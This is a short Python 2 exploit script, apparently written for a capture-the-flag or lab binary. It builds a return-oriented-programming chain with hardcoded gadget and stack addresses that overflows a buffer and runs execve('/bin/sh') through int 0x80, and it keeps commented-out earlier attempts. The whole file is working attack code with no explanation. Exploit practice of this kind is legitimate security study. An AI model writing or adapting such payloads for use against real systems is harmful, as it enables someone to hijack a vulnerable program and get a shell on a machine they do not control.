from struct import pack
shell_str = "/bin/sh" #7
#ret1_xorecx = 0x080aa305
#ret2_xoredx = 0x080ae655
#ret2_movebxeax = 0x080585b4
intx80 = "\x54\x4e\x08\x08" #8084e54
#ret1_edxecx = 0x080573c0
popecxebx = "\xc1\x73\x05\x08" #pop ecx, pop ebx
#incecx = "\x5e\x82\x0b\x08" #80b825e #incecx,incedx,xor eax=0
xoredx = "\xdb\xe3\x08\x08" #mov edx,eax=0; pop ebx; pop esi
inceax = "\x1c\x0c\x05\x08" #0x08050c1c + 4bytes 11 times
popedx = "\x9a\x73\x05\x08" #805739a
#xorecx ="\xb5\xa2\x0a\x08" #0x080aa2b5
#xoredx = "\x05\xe6\x0a\x08" #0x080ae605
#prepeax = "\xff\xff\xff\xff"
shell_addr ="\x80\xe3\xfe\xbf" #0xbffee28c
ecx = "\x78\xe3\xfe\xbf"
ebp = "\x18\xe4\xfe\xbf"  #0xbffee318
nullptr = "\x88\xe3\xfe\xbf"
#print shell_str + "a"* 101 + pack("<I",ebp) + pack("<I",xorecx) "\x90"*44+ prepeax +"\x01"*8 + pack("<I",ebp)+pack("<I",xoredx)+pack("<I",shell_addr)+"\x90"*8+pack("<I",ebp) + pack("<I",xoredx) + "\x90"*108+"\x01"*12+pack("<I",ebp)+pack("<I",ret2_movebxeax)+pack("<I",shell_addr)+"\x01"*8 +pack("<I",ebp)+("\x1c\x0c\x05\x08"+"\x01\x01\x01\x01")*12+ret4_intx80

print "a"* 108 + ebp +xoredx+"aaaa"*2+(inceax+"aaaa")*11+popecxebx+nullptr+shell_addr+popedx+nullptr+intx80+shell_addr+nullptr+shell_str+"\x00"
#popecx+"\xff\xff\xff\xff"+"aaaa"+incecx+xoredx+shell_addr+"\x90"*8+(inceax+"aaaa")*11+intx80
#print "a"